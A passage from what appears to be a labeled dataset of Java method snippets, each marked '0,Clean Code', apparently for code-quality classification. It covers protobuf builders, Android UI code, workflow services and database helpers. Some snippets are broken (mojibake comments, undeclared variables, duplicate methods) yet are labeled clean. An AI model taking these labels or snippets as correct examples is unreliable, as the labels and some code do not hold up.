  quitInfoService.saveOrUpdate(quitInfo);
  return operationLog;
}",0,Clean Code
"/** 
 * <code>optional uint32 level = 3;</code>
 * @param value the level to set
 * @return this
 */
public Equipment setLevel(final int value){
  bitField0_|=0x00000002;
  level=value;
  return this;
}",0,Clean Code
"@Override public int compare(final ISortableTreeNode o1,final ISortableTreeNode o2){
  int value=0;
  final IAddress addr1=o1.getAddress();
  final IAddress addr2=o2.getAddress();
  value=addr1.compareTo(addr2);
  if (order == ESortOrder.DESCENDING) {
    value*=-1;
  }
  return value;
}",0,Clean Code
"/** 
 * A SearchScoreProvider for a single-pass search based on exact similarity. Generally only suitable when your RandomAccessVectorValues is entirely in-memory, e.g. during construction.
 */
public static SearchScoreProvider exact(VectorFloat<?> v,VectorSimilarityFunction vsf,RandomAccessVectorValues ravv){
  var sf=ScoreFunction.Reranker.from(v,vsf,ravv);
  return new SearchScoreProvider(sf);
}
",0,Clean Code
"private void invalidateChatListViewTopPadding(){
  if (!invalidateChatListViewTopPadding) {
    invalidateChatListViewTopPadding=true;
    if (contentView != null) {
      contentView.invalidate();
    }
    if (chatListView != null) {
      chatListView.invalidate();
    }
  }
  int topPanelHeight=topChatPanelView != null && topChatPanelView.getVisibility() == View.VISIBLE ? ((topChatPanelView.getLayoutParams() == null ? AndroidUtilities.dp(50) : topChatPanelView.getLayoutParams().height) - AndroidUtilities.dp(2)) : 0;
  topPanelHeight=topPanelHeight + (int)Math.max(-topPanelHeight,topChatPanelViewOffset);
  float translation=contentPanTranslation + contentPaddingTop + Math.max(0,topPanelHeight);
  if (pinnedMessageView != null) {
    translation+=pinnedMessageEnterOffset;
    pinnedMessageView.setTranslationY(translation);
    translation+=AndroidUtilities.dp(48);
  }
  View pendingRequestsView=pendingRequestsDelegate != null ? pendingRequestsDelegate.getView() : null;
  if (pendingRequestsView != null) {
    translation+=pendingRequestsDelegate.getViewEnterOffset();
    pendingRequestsView.setTranslationY(translation);
  }
  float p=actionBarSearchTags != null ? actionBarSearchTags.getCurrentHeight() : 0;
  if (fragmentContextView != null) {
    float from=0;
    if (fragmentLocationContextView != null && fragmentLocationContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(36);
    }
    fragmentContextView.setTranslationY(contentPanTranslation + p + from+ fragmentContextView.getTopPadding());
  }
  if (fragmentLocationContextView != null) {
    float from=0;
    if (fragmentContextView != null && fragmentContextView.getVisibility() == View.VISIBLE) {
      from+=AndroidUtilities.dp(fragmentContextView.getStyleHeight()) + fragmentContextView.getTopPadding();
    }
    fragmentLocationContextView.setTranslationY(contentPanTranslation + p + from+ fragmentLocationContextView.getTopPadding());
  }
  if (topChatPanelView != null) {
    topChatPanelView.setTranslationY(contentPanTranslation + p + contentPaddingTop+ topChatPanelViewOffset);
  }
  if (alertView != null && alertView.getVisibility() == View.VISIBLE) {
    alertView.setTranslationY(contentPanTranslation + p + contentPaddingTop - AndroidUtilities.dp(50) * (1f - alertViewEnterProgress));
  }
  if (bottomOverlayChat != null) {
    bottomOverlayChat.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (bottomMessagesActionContainer != null) {
    bottomMessagesActionContainer.setTranslationY(bottomPanelTranslationYReverse);
  }
  if (undoView != null) {
    undoView.setAdditionalTranslationY(chatActivityEnterView.getHeightWithTopView() - chatActivityEnterView.getAnimatedTop());
  }
}",0,Clean Code
"public MemorySegmentReader(Path path) throws IOException {
  arena=Arena.ofShared();
  try (var ch=FileChannel.open(path,StandardOpenOption.READ)){
    memory=ch.map(MapMode.READ_ONLY,0L,ch.size(),arena);
  }
 catch (  Exception e) {
    arena.close();
    throw e;
  }
}
MemorySegmentReader(Arena arena,MemorySegment memory){
  this.arena=arena;
  this.memory=memory;
}",0,Clean Code
"@TruffleBoundary public static Object readMember(VmObjectLike receiver,Object memberKey){
  var result=readMemberOrNull(receiver,memberKey);
  if (result != null)   return result;
  throw new VmExceptionBuilder().cannotFindMember(receiver,memberKey).build();
}
@TruffleBoundary public static Object readMember(VmObjectLike receiver,Object memberKey,IndirectCallNode callNode){
  var result=readMemberOrNull(receiver,memberKey,true,callNode);
  if (result != null)   return result;
  throw new VmExceptionBuilder().cannotFindMember(receiver,memberKey).withLocation(callNode).build();
}
",0,Clean Code
"/** 
 * Collects information about special temp variables generated by Soot frontend: (1) collects the temp variables and their relevant definition statements; (2) collects the temp variables that receive invocation results but never used. TODO: remove this step for body parsed from .class files.
 */
private static void preprocessTemps(Body body,Map<Local,AssignStmt> tempToDef,Set<Local> unusedInvokeTempRets){
  MultiMap<Local,AssignStmt> tempToAssigns=Maps.newMultiMap();
  MultiMap<Local,Unit> tempToUses=Maps.newMultiMap();
  for (  Unit unit : body.getUnits()) {
    if (unit instanceof AssignStmt) {
      Value lhs=assign.getLeftOp();
      if (lhs instanceof Local) {
        if (var.getName().startsWith(""temp$"")) {
          tempToAssigns.put(var,assign);
          if (assign.containsInvokeExpr()) {
            unusedInvokeTempRets.add(var);
          }
        }
      }
    }
    unit.getUseBoxes().stream().map(ValueBox::getValue).forEach(value -> {
      if (value instanceof Local) {
        if (var.getName().startsWith(""temp$"")) {
          tempToUses.put(var,unit);
          unusedInvokeTempRets.remove(var);
        }
      }
    }
);
  }
  tempToAssigns.forEachSet((var,assigns) -> {
    if (assigns.size() == 1) {
      AssignStmt assign=CollectionUtils.getOne(assigns);
      Value rhs=assign.getRightOp();
      if ((rhs instanceof Constant || rhs instanceof Local || rhs instanceof BinopExpr) && tempToUses.get(var).size() <= 1) {
        tempToDef.put(var,assign);
      }
    }
  }
);
}",0,Clean Code
"public static com.google.protobuf.Parser<Data> parser(){
  return PARSER;
}
public static com.google.protobuf.Parser<FieldDataSnapshot> parser(){
  return PARSER;
}
",0,Clean Code
"@Override public void reserveSignIn(String uid,Long taskLogId) throws Exception {
  CfLogisticsTaskLog cfLogisticsTaskLog=findById(taskLogId,false);
  CfLogisticsTask cfLogisticsTask=cfLogisticsTaskService.findById(cfLogisticsTaskLog.getTaskId(),false);
  if (!cfLogisticsTaskLog.getDeliverUid().equals(uid)) {
    ExceptionCast.cast(LogisticsCode.APPOINTMENT_RECORD_DOES_NOT_BELONG_TO_YOU);
  }
  if (cfLogisticsTaskLog.getTaskLogStatus() != (byte)0) {
    ExceptionCast.cast(LogisticsCode.CHECK_IN_IS_PROHIBITED);
  }
  if (cfLogisticsTaskLog.getPid() != (byte)0) {
    ExceptionCast.cast(LogisticsCode.CHECK_IN_IS_PROHIBITED);
  }
  noticeDirverQueueOrDriverLoadingOrUnloading(cfLogisticsTaskLog,""desc"");
  CfLogisticsFactory cfLogisticsFactory=cfLogisticsFactoryService.findById(cfLogisticsTask.getFactoryId(),false);
  if (StringUtils.isNotEmpty(cfLogisticsFactory.getCarParkIds())) {
    String[] carParkIds=cfLogisticsFactory.getCarParkIds().split("","");
    if (carParkIds.length == 0) {
      return;
    }
    for (int i=0; i < carParkIds.length; i++) {
      CfCarPark cfCarPark=cfCarParkService.findById(carParkIds[i]);
      if (cfCarPark == null) {
        continue;
      }
      CfCarParkVisit cfCarParkVisit=new CfCarParkVisit();
      cfCarParkVisit.setCarParkId(new Long(carParkIds[i]));
      cfCarParkVisit.setExpirationTime(System.currentTimeMillis() + 86400000l);
      cfCarParkVisit.setFromUid(new Long(cfLogisticsTaskLog.getDeliverUid()));
      cfCarParkVisit.setPlateNumber(cfLogisticsTaskLog.getNumberPlate());
      cfCarParkVisit.setProcessStatus((byte)1);
      cfCarParkVisitService.add(cfCarParkVisit);
    }
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.FeatureSetProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.FeatureSetProto other=(org.tribuo.protos.core.FeatureSetProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"/** 
 * <code>repeated .Material material_list = 7;</code>
 * @param value the materialList to add
 * @return this
 */
public GetBagScRsp addMaterialList(final MaterialOuterClass.Material value){
  bitField0_|=0x00000002;
  materialList.add(value);
  return this;
}",0,Clean Code
"/** 
 * 寮瑰嚭璋冪敤id
 * @return 璋冪敤id
 */
public long popInvokeId(){
  long invokeId=stack.pop();
  if (stack.isEmpty()) {
    invokeRef.remove();
  }
  return invokeId;
}
",0,Clean Code
"@Override public DataProxyNodeResponse getDataProxyNodesByCluster(String clusterName,String protocolType,String reportSourceType){
  LOGGER.debug(""begin to get data proxy nodes for clusterName={}, protocol={}"",clusterName,protocolType);
  InlongClusterEntity clusterEntity=clusterMapper.selectByNameAndType(clusterName,ClusterType.DATAPROXY);
  DataProxyNodeResponse response=new DataProxyNodeResponse();
  if (clusterEntity == null) {
    LOGGER.debug(""not any dataproxy cluster for clusterName={}, protocol={}"",clusterName,protocolType);
    return response;
  }
  List<InlongClusterNodeEntity> nodeEntities=clusterNodeMapper.selectByParentId(clusterEntity.getId(),protocolType);
  if (CollectionUtils.isEmpty(nodeEntities)) {
    LOGGER.debug(""not any data proxy node for clusterName={}, protocol={}"",clusterName,protocolType);
    return response;
  }
  response.setClusterId(clusterEntity.getId());
  List<DataProxyNodeInfo> nodeList=new ArrayList<>();
  for (  InlongClusterNodeEntity nodeEntity : nodeEntities) {
    if (Objects.equals(nodeEntity.getStatus(),NodeStatus.HEARTBEAT_TIMEOUT.getStatus())) {
      LOGGER.debug(""dataproxy node was timeout, parentId={} ip={} port={}"",nodeEntity.getParentId(),nodeEntity.getIp(),nodeEntity.getPort());
      continue;
    }
    if (StringUtils.isNotBlank(nodeEntity.getExtParams())) {
      DataProxyClusterNodeDTO dataProxyClusterNodeDTO=DataProxyClusterNodeDTO.getFromJson(nodeEntity.getExtParams());
      if (StringUtils.isBlank(dataProxyClusterNodeDTO.getReportSourceType())) {
        dataProxyClusterNodeDTO.setReportSourceType(ReportResourceType.INLONG);
      }
      if (StringUtils.isNotBlank(reportSourceType) && !Objects.equals(dataProxyClusterNodeDTO.getReportSourceType(),reportSourceType)) {
        continue;
      }
      if (Objects.equals(dataProxyClusterNodeDTO.getEnabledOnline(),false)) {
        continue;
      }
    }
    DataProxyNodeInfo nodeInfo=new DataProxyNodeInfo();
    nodeInfo.setId(nodeEntity.getId());
    nodeInfo.setIp(nodeEntity.getIp());
    nodeInfo.setPort(nodeEntity.getPort());
    nodeInfo.setProtocolType(nodeEntity.getProtocolType());
    nodeInfo.setNodeLoad(nodeEntity.getNodeLoad());
    nodeList.add(nodeInfo);
  }
  response.setNodeList(nodeList);
  if (LOGGER.isDebugEnabled()) {
    LOGGER.debug(""success to get dp nodes for clusterName={}, protocol={}, result={}"",clusterName,protocolType,response);
  }
  return response;
}
",0,Clean Code
"public void load(RandomAccessReader in) throws IOException {
  if (graph.size() != 0) {
    throw new IllegalStateException(""Cannot load into a non-empty graph"");
  }
  int size=in.readInt();
  int entryNode=in.readInt();
  int maxDegree=in.readInt();
  for (int i=0; i < size; i++) {
    int node=in.readInt();
    int nNeighbors=in.readInt();
    var sf=scoreProvider.searchProviderFor(node).exactScoreFunction();
    var ca=new NodeArray(maxDegree);
    for (int j=0; j < nNeighbors; j++) {
      int neighbor=in.readInt();
      ca.addInOrder(neighbor,sf.similarityTo(neighbor));
    }
    graph.addNode(node,new ConcurrentNeighborSet(node,maxDegree,(int)(maxDegree * neighborOverflow),scoreProvider,alpha,ca));
  }
  graph.updateEntryNode(entryNode);
}",0,Clean Code
"@Override public String signature(@Nullable Object t){
  if (t == null) {
    return ""{undefined}"";
  }
  if (t instanceof Class) {
    Class<?> clazz=(Class<?>)t;
    if (clazz.isArray()) {
      return arraySignature(clazz);
    }
 else     if (clazz.isPrimitive()) {
      return primitiveSignature(clazz);
    }
    StringBuilder s=new StringBuilder(classSignature(clazz));
    if (clazz.getTypeParameters().length > 0) {
      StringJoiner typeParams=new StringJoiner("", "",""<"","">"");
      for (      TypeVariable<?> typeParameter : clazz.getTypeParameters()) {
        typeParams.add(signature(typeParameter));
      }
      s.append(typeParams);
    }
    return s.toString();
  }
 else   if (t instanceof ParameterizedType) {
    return parameterizedSignature(t);
  }
 else   if (t instanceof WildcardType) {
    return genericSignature(t);
  }
 else   if (t instanceof TypeVariable) {
    return genericSignature(t);
  }
 else   if (t instanceof GenericArrayType) {
    return arraySignature(t);
  }
  throw new UnsupportedOperationException(""Unknown type "" + t.getClass().getName());
}",0,Clean Code
"private static boolean isLikelyDependencyConfiguration(Cursor cursor){
  if (!(cursor.getValue() instanceof J.MethodInvocation)) {
    return false;
  }
  J.MethodInvocation m=cursor.getValue();
  if (DEPENDENCY_CONFIGURATION_MATCHER.matches(m)) {
    return true;
  }
  if (m.getType() != null) {
    return false;
  }
  while (cursor != null) {
    if (cursor.getValue() instanceof J.MethodInvocation) {
      m=cursor.getValue();
      String methodName=m.getSimpleName();
      if (""constraints"".equals(methodName)) {
        return false;
      }
      if (DEPENDENCY_DSL_MATCHER.matches(m)) {
        return true;
      }
    }
    cursor=cursor.getParent();
  }
  return false;
}
",0,Clean Code
"@Override public List<FlowDataDealRecord> getMainByModuleIdAndDataId(Long moduleId,Long dataId){
  return lambdaQuery().eq(FlowDataDealRecord::getModuleId,moduleId).eq(FlowDataDealRecord::getDataId,dataId).orderByDesc(FlowDataDealRecord::getCreateTime).list();
}
",0,Clean Code
"/** 
 * The flavor of this release (native, or Java and JVM version). 
 */
public String flavor(){
  return flavor;
}
",0,Clean Code
"/** 
 * Returns the converter with the given source and target types. Throws  {@link ConversionException} if no such converter exists.
 */
<S,T>Converter<S,T> getConverter(PClassInfo<S> sourceType,Type targetType);
/** 
 * Same as  {@link #getConverter(PClassInfo,Type)}, except that the target type is narrowed from {@link Type} to {@link Class} to allow for better type inference.
 */
default <S,T>Converter<S,T> getConverter(PClassInfo<S> sourceType,Class<T> targetType){
  return getConverter(sourceType,(Type)targetType);
}
",0,Clean Code
"@Override public ProcessDetailResponse detail(Integer processId,Integer taskId,String operator){
  WorkflowProcessEntity processEntity=this.getProcessEntity(processId);
  if (processEntity == null) {
    return null;
  }
  WorkflowTaskEntity taskEntity=null;
  if (taskId == null) {
    if (!operator.equals(processEntity.getApplicant())) {
      throw new WorkflowException(""current user is not the applicant of the process"");
    }
  }
 else {
    taskEntity=this.getTaskEntity(taskId);
    List<String> taskApprovers=Arrays.asList(taskEntity.getApprovers().split(InlongConstants.COMMA));
    if (!taskApprovers.contains(operator)) {
      ApproverPageRequest query=ApproverPageRequest.builder().processName(processEntity.getName()).build();
      List<WorkflowApproverEntity> approverList=approverMapper.selectByCondition(query);
      boolean match=approverList.stream().anyMatch(entity -> Preconditions.inSeparatedString(operator,entity.getApprovers(),InlongConstants.COMMA));
      if (!match) {
        throw new WorkflowException(""current user is not the approver of the process"");
      }
    }
  }
  WorkflowProcess process=definitionRepository.get(processEntity.getName());
  TaskResponse currentTask=null;
  if (taskEntity != null) {
    currentTask=WorkflowUtils.getTaskResponse(taskEntity);
    if (process != null && TaskStatus.PENDING.equals(currentTask.getStatus())) {
      WorkflowTask task=process.getTaskByName(currentTask.getName());
      currentTask.setFormData(this.getEmptyTaskForm(task));
    }
    if (!processId.equals(currentTask.getProcessId())) {
      throw new WorkflowException(""task ["" + taskId + ""] not belongs to process [""+ processId+ ""]"");
    }
  }
  ProcessDetailResponse detailResponse=this.getProcessDetail(processId,processEntity);
  detailResponse.setCurrentTask(currentTask);
  if (process == null || process.getProcessDetailHandler() == null) {
    return detailResponse;
  }
  return process.getProcessDetailHandler().handle(detailResponse);
}
",0,Clean Code
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      int[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float yPercentage=(float)y[i] * chartData.linesK[k] / h;
        float yPoint=(1f - yPercentage) * (bottom - top);
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",0,Clean Code
"@Test(dataProvider=""referenceTrackingConfig"") public void testJdkProxy(boolean referenceTracking){
  Fury fury=Fury.builder().withLanguage(Language.JAVA).withRefTracking(referenceTracking).requireClassRegistration(false).build();
  Function function=(Function)Proxy.newProxyInstance(fury.getClassLoader(),new Class[]{Function.class},new TestInvocationHandler());
  Function deserializedFunction=(Function)fury.deserialize(fury.serialize(function));
  assertEquals(deserializedFunction.apply(null),1);
}",0,Clean Code
"public void setGroupUnreadCodes(ArrayList<Long> arrayList){
  this.groupUnreadCodes=arrayList;
}
",0,Clean Code
"/** 
 * <code>repeated .Material material_list = 7;</code>
 * @param values the materialList to add
 * @return this
 */
public PlayerSyncScNotify addAllMaterialList(final MaterialOuterClass.Material... values){
  bitField0_|=0x00000100;
  materialList.addAll(values);
  return this;
}",0,Clean Code
"private void bindForState(DownloadHolder holder,DownloadInfo info){
  Resources resources=getResources2();
  if (null == resources) {
    return;
  }
switch (info.state) {
case DownloadInfo.STATE_NONE:
    bindState(holder,info,resources.getString(R.string.download_state_none));
  break;
case DownloadInfo.STATE_WAIT:
case DownloadInfo.STATE_UPDATE:
bindState(holder,info,resources.getString(R.string.download_state_wait));
break;
case DownloadInfo.STATE_DOWNLOAD:
bindProgress(holder,info);
break;
case DownloadInfo.STATE_FAILED:
String text;
if (info.legacy <= 0) {
text=resources.getString(R.string.download_state_failed);
}
 else {
text=resources.getString(R.string.download_state_failed_2,info.legacy);
}
bindState(holder,info,text);
break;
case DownloadInfo.STATE_FINISH:
bindState(holder,info,resources.getString(R.string.download_state_finish));
break;
}
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SetDisplayAvatarScRsp)) {
    return false;
  }
  SetDisplayAvatarScRsp other=(SetDisplayAvatarScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasRetcode() || retcode == other.retcode) && (!hasDisplayAvatarList() || displayAvatarList.equals(other.displayAvatarList));
}",0,Clean Code
"public static void main(String[] args){
  BeanFactory beanFactory=new AnnotationConfigApplicationContext(MyBean.class).getBeanFactory();
  Object bean=beanFactory.getBean(""myBean"");
  System.out.println(""閫氳繃鍚嶇О鑾峰彇Bean: "" + bean);
  ObjectProvider<MyBean> objectProvider=beanFactory.getBeanProvider(MyBean.class);
  System.out.println(""鑾峰彇Bean鐨凮bjectProvider: "" + objectProvider);
  Class<?> beanType=beanFactory.getType(""myBean"");
  System.out.println(""鑾峰彇Bean鐨勭被鍨�: "" + beanType);
  boolean containsBean=beanFactory.containsBean(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁鍖呭惈Bean: "" + containsBean);
  boolean isSingleton=beanFactory.isSingleton(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁涓哄崟渚�: "" + isSingleton);
  boolean isPrototype=beanFactory.isPrototype(""myBean"");
  System.out.println(""鍒ゆ柇鏄惁涓哄師鍨�: "" + isPrototype);
  boolean isTypeMatch=beanFactory.isTypeMatch(""myBean"",ResolvableType.forClass(MyBean.class));
  System.out.println(""鍒ゆ柇鏄惁鍖归厤鎸囧畾绫诲瀷: "" + isTypeMatch);
  String[] aliases=beanFactory.getAliases(""myBean"");
  System.out.println(""鑾峰彇Bean鐨勬墍鏈夊埆鍚�: "" + String.join("", "",aliases));
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.IndexedArrayExampleProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.IndexedArrayExampleProto other=(org.tribuo.protos.core.IndexedArrayExampleProto)obj;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (getOutputIdx() != other.getOutputIdx())   return false;
  if (!getFeatureNameList().equals(other.getFeatureNameList()))   return false;
  if (!getFeatureIdxList().equals(other.getFeatureIdxList()))   return false;
  if (!getFeatureValueList().equals(other.getFeatureValueList()))   return false;
  if (!internalGetMetadata().equals(other.internalGetMetadata()))   return false;
  if (java.lang.Float.floatToIntBits(getWeight()) != java.lang.Float.floatToIntBits(other.getWeight()))   return false;
  if (hasFeatureDomain() != other.hasFeatureDomain())   return false;
  if (hasFeatureDomain()) {
    if (!getFeatureDomain().equals(other.getFeatureDomain()))     return false;
  }
  if (hasOutputDomain() != other.hasOutputDomain())   return false;
  if (hasOutputDomain()) {
    if (!getOutputDomain().equals(other.getOutputDomain()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private void copyExtras(Intent intent){
  if (mExtras != null) {
    intent.replaceExtras(mExtras);
  }
}
",0,Clean Code
"/** 
 * Returns whether the last composed word contains line-breaking character (e.g. CR or LF).
 * @param text the text to be examined.
 * @return {@code true} if the last composed word contains line-breaking separator.
 */
public static boolean hasLineBreakCharacter(@Nullable final String text){
  if (isEmpty(text)) {
    return false;
  }
  for (int i=text.length() - 1; i >= 0; --i) {
    final char c=text.charAt(i);
switch (c) {
case CHAR_LINE_FEED:
case CHAR_VERTICAL_TAB:
case CHAR_FORM_FEED:
case CHAR_CARRIAGE_RETURN:
case CHAR_NEXT_LINE:
case CHAR_LINE_SEPARATOR:
case CHAR_PARAGRAPH_SEPARATOR:
      return true;
  }
}
return false;
}",0,Clean Code
"@Override protected final void onCreate(@Nullable Bundle savedInstanceState){
  setTheme(Prefs.Appearance.isPureBlackTheme() ? R.style.AppTheme_Splash_Black : R.style.AppTheme_Splash);
  EdgeToEdge.enable(this);
  super.onCreate(savedInstanceState);
  SplashScreen.installSplashScreen(this);
  DynamicColors.applyToActivityIfAvailable(this);
  setContentView(R.layout.activity_authentication);
  ((TextView)findViewById(R.id.version)).setText(String.format(Locale.ROOT,""%s (%d)"",BuildConfig.VERSION_NAME,BuildConfig.VERSION_CODE));
  mStateNameView=findViewById(R.id.state_name);
  if (Ops.isAuthenticated()) {
    Log.d(TAG,""Already authenticated."");
    startActivity(new Intent(this,MainActivity.class));
    finish();
    return;
  }
  if (Boolean.TRUE.equals(BuildExpiryChecker.buildExpired())) {
    BuildExpiryChecker.getBuildExpiredDialog(this).show();
    return;
  }
  mViewModel=new ViewModelProvider(this).get(SecurityAndOpsViewModel.class);
  Log.d(TAG,""Waiting to be authenticated."");
  mViewModel.authenticationStatus().observe(this,status -> {
switch (status) {
case Ops.STATUS_AUTO_CONNECT_WIRELESS_DEBUGGING:
      Log.d(TAG,""Try auto-connecting to wireless debugging."");
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
      mViewModel.autoConnectWirelessDebugging();
      return;
    }
case Ops.STATUS_WIRELESS_DEBUGGING_CHOOSER_REQUIRED:
  Log.d(TAG,""Display wireless debugging chooser (pair or connect)"");
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
  Ops.connectWirelessDebugging(this,mViewModel);
  return;
}
case Ops.STATUS_ADB_CONNECT_REQUIRED:
Log.d(TAG,""Display connect dialog."");
Ops.connectAdbInput(this,mViewModel);
return;
case Ops.STATUS_ADB_PAIRING_REQUIRED:
Log.d(TAG,""Display pairing dialog."");
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
Ops.pairAdbInput(this,mViewModel);
return;
}
case Ops.STATUS_FAILURE_ADB_NEED_MORE_PERMS:
Ops.displayIncompleteUsbDebuggingMessage(this);
case Ops.STATUS_SUCCESS:
case Ops.STATUS_FAILURE:
Log.d(TAG,""Authentication completed."");
mViewModel.setAuthenticating(false);
Ops.setAuthenticated(this,true);
startActivity(new Intent(this,MainActivity.class));
finish();
}
}
);
if (!mViewModel.isAuthenticating()) {
mViewModel.setAuthenticating(true);
authenticate();
}
}
",0,Clean Code
"/** 
 * <code>repeated uint32 daily_active_quest_id_list = 1;</code>
 * @param values the dailyActiveQuestIdList to add
 * @return this
 */
public DailyActiveInfoNotify addAllDailyActiveQuestIdList(final int... values){
  bitField0_|=0x00000002;
  dailyActiveQuestIdList.addAll(values);
  return this;
}",0,Clean Code
"private static FinalTypeField buildFinalTypeField(Fury fury,Descriptor d){
  return new FinalTypeField(d.getRawType(),d.getDeclaringClass() + ""."" + d.getName(),d.getField() != null ? FieldAccessor.createAccessor(d.getField()) : null,fury);
}
",0,Clean Code
"private EMailInfoDto TransEmailToDto(List<SystemParameter> paramList){
  EMailInfoDto mailInfo=new EMailInfoDto();
  if (!CollectionUtils.isEmpty(paramList)) {
    for (    SystemParameter param : paramList) {
      if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.SERVER.getValue())) {
        mailInfo.setHost(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.PORT.getValue())) {
        mailInfo.setPort(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.ACCOUNT.getValue())) {
        mailInfo.setAccount(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.FROM.getValue())) {
        mailInfo.setFrom(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.PASSWORD.getValue())) {
        String password=EncryptUtils.aesDecrypt(param.getParamValue()).toString();
        mailInfo.setPassword(password);
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.SSL.getValue())) {
        mailInfo.setSsl(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.TSL.getValue())) {
        mailInfo.setTsl(param.getParamValue());
      }
 else       if (StringUtils.equals(param.getParamKey(),ParamConstants.MAIL.RECIPIENTS.getValue())) {
        mailInfo.setRecipient(param.getParamValue());
      }
    }
  }
  return mailInfo;
}
",0,Clean Code
"@Override public int nextSetBit(int index){
  assert index >= 0 && index < length() : ""index="" + index + "", length=""+ length();
  int i=index(index);
  if (i >= storage.length()) {
    return DocIdSetIterator.NO_MORE_DOCS;
  }
  long word=storage.get(i) & (-1L << (index & 63));
  while (true) {
    if (word != 0) {
      return (i << 6) + Long.numberOfTrailingZeros(word);
    }
    if (++i >= storage.length()) {
      return DocIdSetIterator.NO_MORE_DOCS;
    }
    word=storage.get(i);
  }
}",0,Clean Code
"/** 
 * JNDI object factory so the proxy can be used as a resource.
 */
public Object getObjectInstance(Object obj,Name name,Context nameCtx,Hashtable<?,?> environment) throws Exception {
  Reference ref=(Reference)obj;
  String api=null;
  String url=null;
  for (int i=0; i < ref.size(); i++) {
    RefAddr addr=ref.get(i);
    String type=addr.getType();
    String value=(String)addr.getContent();
    if (type.equals(""type""))     api=value;
 else     if (type.equals(""url""))     url=value;
 else     if (type.equals(""user""))     setUser(value);
 else     if (type.equals(""password""))     setPassword(value);
  }
  if (url == null)   throw new NamingException(""`url' must be configured for HessianProxyFactory."");
  if (api == null)   throw new NamingException(""`type' must be configured for HessianProxyFactory."");
  Class apiClass=Class.forName(api,false,_loader);
  return create(apiClass,url);
}",0,Clean Code
"/** 
 * Executes the given batch of INSERT SQL statements. The <code>Connection</code> is retrieved from the <code>DataSource</code> set in the constructor.  This <code>Connection</code> must be in auto-commit mode or the insert will not be saved.
 * @param sql The SQL statement to execute.the <code>ResultSet</code> of auto-generated keys.
 * @param params Initializes the PreparedStatement's IN (i.e. '?')
 * @return The result generated by the handler.
 * @throws SQLException if a database access error occurs
 * @since 1.6
 */
public int[] insertBatch(String sql,Object[][] params) throws SQLException {
  return insertBatch(this.prepareConnection(),true,sql,params);
}
/** 
 * Executes the given batch of INSERT SQL statements.
 * @param conn The connection to use to run the query.
 * @param sql The SQL to execute.the <code>ResultSet</code> of auto-generated keys.
 * @param params The query replacement parameters.
 * @return The result generated by the handler.
 * @throws SQLException if a database access error occurs
 * @since 1.6
 */
public int[] insertBatch(Connection conn,String sql,Object[][] params) throws SQLException {
  return insertBatch(conn,false,sql,params);
}
/** 
 * Executes the given batch of INSERT SQL statements.
 * @param conn The connection to use for the query call.
 * @param closeConn True if the connection should be closed, false otherwise.
 * @param sql The SQL statement to execute.the <code>ResultSet</code> of auto-generated keys.
 * @param params The query replacement parameters.
 * @return The result generated by the handler.
 * @throws SQLException If there are database or parameter errors.
 * @since 1.6
 */
private int[] insertBatch(Connection conn,boolean closeConn,String sql,Object[][] params) throws SQLException {
  if (conn == null) {
    throw new SQLException(""Null connection"");
  }
  if (sql == null) {
    if (closeConn) {
